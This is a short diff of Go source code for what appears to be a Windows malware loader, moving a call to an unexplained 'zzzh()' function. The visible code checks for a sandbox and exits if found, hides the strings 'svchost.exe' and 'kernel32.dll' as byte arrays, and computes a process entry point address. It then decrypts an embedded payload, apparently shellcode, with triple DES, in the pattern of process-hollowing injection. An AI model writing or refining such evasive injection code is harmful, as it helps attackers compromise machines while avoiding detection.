@@ -211,7 +211,7 @@ func main() {
     if CheckSandbox() {
         return 
     }
-	zzzh()
+	
 
 	epath := []byte{
 		'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 's', 'v', 'c', 'h', 'o', 's', 't', '.', 'e', 'x', 'e',
@@ -269,6 +269,7 @@ func main() {
 	entrypointOffsetPos := addressBuffer[entrypointOffset : entrypointOffset+0x4]
 	entrypointRVA := binary.LittleEndian.Uint32(entrypointOffsetPos)
 	entrypointAddress := imageBaseValue + uint64(entrypointRVA)
+	zzzh()
 	decryptedsch, err := decryptDES3(sch, key, iv)
 		syscall.MustLoadDLL(string([]byte{
 		'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l',
